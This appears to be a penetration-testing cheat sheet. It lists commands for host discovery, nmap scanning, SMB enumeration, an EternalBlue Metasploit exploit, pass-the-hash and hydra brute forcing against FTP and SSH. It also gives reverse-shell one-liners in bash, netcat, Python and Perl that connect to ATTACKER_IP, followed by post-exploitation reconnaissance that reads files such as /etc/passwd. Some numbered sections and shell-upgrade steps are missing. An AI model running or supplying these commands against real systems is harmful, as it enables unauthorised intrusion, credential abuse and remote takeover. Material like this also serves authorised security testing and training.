01Host Discovery
# Ping Sweep
bash
# Nmap ping sweep (no port scan)
nmap -sn 192.168.1.0/24

# ARP scan (more reliable on LAN)
arp-scan -l
netdiscover -r 192.168.1.0/24

# fping
fping -ag 192.168.1.0/24 2>/dev/null
02Port Scanning
Workflow: Fast scan to find open ports → targeted scan with scripts on open ports only. Saves time.
# Nmap Scan Workflow
bash
# Step 1 — Fast scan all ports
nmap -p- --open -T4 TARGET_IP -oN ports.txt

# Step 2 — Deep scan open ports only
nmap -sC -sV -p 22,80,443,445 TARGET_IP -oN detailed.txt

# UDP scan (top 100 — slower)
nmap -sU --top-ports 100 TARGET_IP

# OS detection + aggressive
nmap -A -O TARGET_IP

# Vulnerability scripts
nmap --script vuln TARGET_IP

# Stealth SYN scan
nmap -sS TARGET_IP

# Scan with no ping (host may block ping)
nmap -Pn -sV TARGET_IP
# Nmap Output Flags
bash
-oN out.txt    # normal text output
-oX out.xml    # XML output (for Metasploit import)
-oG out.gnmap  # grepable output
-oA out        # all three at once

04SMB Attacks (port 139/445)
Key target: SMB is gold. Always check for null sessions, readable shares, and EternalBlue (MS17-010).
# SMB Enumeration
bash
# enum4linux — full enum
enum4linux -a TARGET_IP

# List shares
smbclient -L //TARGET_IP/ -N    # null session
smbmap -H TARGET_IP

# Connect to share
smbclient //TARGET_IP/sharename -N

# NetExec (modern CrackMapExec replacement)
nxc smb TARGET_IP -u '' -p '' --shares
nxc smb TARGET_IP -u admin -p password

# Nmap SMB scripts
nmap --script smb-enum-shares,smb-enum-users -p 445 TARGET_IP
nmap --script smb-vuln-ms17-010 -p 445 TARGET_IP
# EternalBlue (MS17-010) — Metasploit
msf
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
# Pass the Hash
bash
nxc smb TARGET_IP -u Administrator -H NTLM_HASH
impacket-psexec Administrator@TARGET_IP -hashes :NTLM_HASH
05FTP / SSH
# FTP (port 21)
bash
# Try anonymous login first
ftp TARGET_IP
# Username: anonymous  |  Password: (blank or anonymous@)

# Nmap FTP scripts
nmap --script ftp-anon,ftp-bounce,ftp-syst -p 21 TARGET_IP

# Brute force FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP

# Download all files from FTP
wget -m --no-passive ftp://anonymous:@TARGET_IP
# SSH (port 22)
bash
# Basic connect
ssh user@TARGET_IP
ssh -p 2222 user@TARGET_IP      # non-standard port

# Connect with private key
ssh -i id_rsa user@TARGET_IP
chmod 600 id_rsa                  # required before using key

# Brute force SSH
hydra -l root -P rockyou.txt ssh://TARGET_IP
hydra -L users.txt -P rockyou.txt ssh://TARGET_IP -t 4

# SSH version banner
nc TARGET_IP 22

07Shells & Listeners
# Netcat Reverse Shells
bash
# Start listener (attacker)
nc -lvnp 4444
rlwrap nc -lvnp 4444          # with readline support

# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Netcat (target)
nc ATTACKER_IP 4444 -e /bin/sh

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
# Upgrade Shell to Full TTY
bash
# Step 1 — Spawn PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Step 2 — Background shell
Ctrl + Z

# Step 3 — Fix terminal

fg

# Step 4 — Fix size

08Post-Exploitation

id && whoami             # current user
uname -a                  # kernel version
hostname                  # hostname
ip a                      # network interfaces
cat /etc/passwd           # local users
cat /etc/hosts            # internal hosts
ss -tnp                   # open connections
ps aux                    # running processes
env                       # environment variables
find / -name "*.txt" 2>/dev/null  # search files
